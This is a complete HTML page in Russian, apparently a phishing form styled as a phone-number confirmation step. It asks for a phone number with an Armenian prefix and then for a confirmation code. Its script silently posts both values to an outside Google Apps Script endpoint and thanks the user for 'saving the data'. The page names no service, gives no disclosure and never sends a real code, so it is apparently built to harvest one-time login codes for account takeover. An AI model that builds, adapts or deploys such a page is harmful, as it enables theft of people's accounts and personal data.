<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Подтверждение номера</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(135deg, #ece9e6, #ffffff);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: #fff;
      padding: 30px;
      width: 100%;
      max-width: 400px;
      border-radius: 15px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      transition: 0.3s ease;
      animation: fadeIn 0.5s ease-in-out;
    }
    .card:hover {
      transform: translateY(-3px);
      box-shadow: 0 12px 25px rgba(0,0,0,0.15);
    }
    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      transition: 0.3s;
    }
    input:focus {
      border-color: #5e9eff;
      box-shadow: 0 0 3px #5e9eff;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #5e9eff;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #397be8;
    }
    #codeSection {
      margin-top: 20px;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(10px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Введите номер телефона</h2>
    <input type="text" id="phone" placeholder="+374..." />
    <button onclick="savePhone()">Продолжить</button>

    <div id="codeSection" style="display:none;">
      <h2>Введите код подтверждения</h2>
      <input type="text" id="code" placeholder="Код" />
      <button onclick="saveCode()">Подтвердить</button>
    </div>
  </div>

  <script>
    let savedPhone = '';
    const url = 'https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec';

    function savePhone() {
      savedPhone = document.getElementById('phone').value.trim();
      if (!savedPhone) return alert('Введите номер телефона!');
      document.getElementById('codeSection').style.display = 'block';

      fetch(url, {
        method: 'POST',
        body: JSON.stringify({ phone: savedPhone, code: '' }),
        headers: { 'Content-Type': 'application/json' }
      });
    }

    function saveCode() {
      const code = document.getElementById('code').value.trim();
      if (!code) return alert('Введите код!');
      
      fetch(url, {
        method: 'POST',
        body: JSON.stringify({ phone: savedPhone, code: code }),
        headers: { 'Content-Type': 'application/json' }
      }).then(() => {
        alert('Спасибо! Данные сохранены.');
      });
    }
  </script>
</body>
</html>
